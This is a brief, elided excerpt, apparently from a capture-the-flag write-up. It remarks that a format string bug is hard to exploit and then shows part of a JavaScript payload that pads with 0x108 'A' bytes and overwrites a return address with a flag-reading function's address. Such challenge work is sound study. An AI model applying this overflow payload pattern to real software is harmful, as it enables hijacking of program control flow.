...
input isn't on the stack, so exploiting this format string vulnerability to
get the flag is rather difficult.
...
let payload = [
    ...
    Buffer.from("A".repeat(0x108)), Buffer.from(read_flag_address),
    Buffer.from("\n"),
